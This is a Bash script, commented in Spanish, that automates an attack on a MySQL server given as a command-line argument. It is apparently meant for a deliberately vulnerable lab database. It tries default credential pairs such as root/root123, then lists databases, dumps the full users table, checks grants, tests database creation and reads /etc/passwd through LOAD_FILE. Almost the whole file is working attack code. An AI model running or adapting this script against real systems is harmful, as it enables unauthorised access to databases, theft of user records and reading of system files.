#!/bin/bash

# Script para explotar la base de datos vulnerable

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Uso: $0 <HOST> [PORT]${NC}"
    echo "Ejemplo: $0 localhost 3306"
    exit 1
fi

DB_HOST="$1"
DB_PORT="${2:-3306}"

echo -e "${BLUE}=== Explotando Base de Datos Vulnerable ===${NC}\n"

# Verificar si mysql client está instalado
if ! command -v mysql &> /dev/null; then
    echo -e "${YELLOW}mysql client no está instalado. Instalando...${NC}"
    sudo apt-get update -y && sudo apt-get install -y mysql-client || {
        echo -e "${RED}No se pudo instalar mysql client${NC}"
        exit 1
    }
fi

# 1. Intentar conexión con credenciales por defecto
echo -e "${YELLOW}[1] Intentando conexión con credenciales por defecto...${NC}"

# root/root123
echo -e "${YELLOW}   Probando root/root123...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u root -proot123 -e "SELECT 'Connection successful' AS status;" 2>/dev/null && {
    echo -e "${GREEN}✓ Conexión exitosa con root/root123${NC}"
    DB_USER="root"
    DB_PASS="root123"
} || {
    # admin/admin123
    echo -e "${YELLOW}   Probando admin/admin123...${NC}"
    mysql -h "$DB_HOST" -P "$DB_PORT" -u admin -padmin123 -e "SELECT 'Connection successful' AS status;" 2>/dev/null && {
        echo -e "${GREEN}✓ Conexión exitosa con admin/admin123${NC}"
        DB_USER="admin"
        DB_PASS="admin123"
    } || {
        # test/test123
        echo -e "${YELLOW}   Probando test/test123...${NC}"
        mysql -h "$DB_HOST" -P "$DB_PORT" -u test -ptest123 -e "SELECT 'Connection successful' AS status;" 2>/dev/null && {
            echo -e "${GREEN}✓ Conexión exitosa con test/test123${NC}"
            DB_USER="test"
            DB_PASS="test123"
        } || {
            echo -e "${RED}✗ No se pudo conectar con credenciales por defecto${NC}"
            exit 1
        }
    }
}

# 2. Listar bases de datos
echo -e "\n${YELLOW}[2] Listando bases de datos...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SHOW DATABASES;" 2>/dev/null
echo -e "${GREEN}✓ Bases de datos listadas${NC}"

# 3. Acceder a la base de datos vulnerable
echo -e "\n${YELLOW}[3] Accediendo a vulnerable_db...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" vulnerable_db -e "SHOW TABLES;" 2>/dev/null
echo -e "${GREEN}✓ Acceso a vulnerable_db exitoso${NC}"

# 4. Leer datos de la tabla users
echo -e "\n${YELLOW}[4] Leyendo datos de la tabla users...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" vulnerable_db -e "SELECT * FROM users;" 2>/dev/null
echo -e "${GREEN}✓ Datos de users leídos${NC}"

# 5. Verificar permisos del usuario
echo -e "\n${YELLOW}[5] Verificando permisos del usuario...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SHOW GRANTS;" 2>/dev/null
echo -e "${GREEN}✓ Permisos verificados${NC}"

# 6. Intentar crear una nueva base de datos (si tiene permisos)
echo -e "\n${YELLOW}[6] Probando creación de base de datos...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "CREATE DATABASE IF NOT EXISTS test_exploit;" 2>/dev/null && {
    echo -e "${GREEN}✓ Base de datos creada (permisos elevados)${NC}"
    mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "DROP DATABASE test_exploit;" 2>/dev/null
} || {
    echo -e "${YELLOW}   No se pudo crear base de datos (permisos limitados)${NC}"
}

# 7. Intentar lectura de archivos del sistema
echo -e "\n${YELLOW}[7] Probando lectura de archivos del sistema...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SELECT LOAD_FILE('/etc/passwd');" 2>/dev/null | head -5 && {
    echo -e "${GREEN}⚠ Puede leer archivos del sistema${NC}"
} || {
    echo -e "${YELLOW}   No se pueden leer archivos del sistema${NC}"
}

# 8. Verificar versión de MySQL
echo -e "\n${YELLOW}[8] Verificando versión de MySQL...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SELECT VERSION();" 2>/dev/null
echo -e "${GREEN}✓ Versión verificada${NC}"

echo -e "\n${BLUE}=== Explotación de Base de Datos Completada ===${NC}"

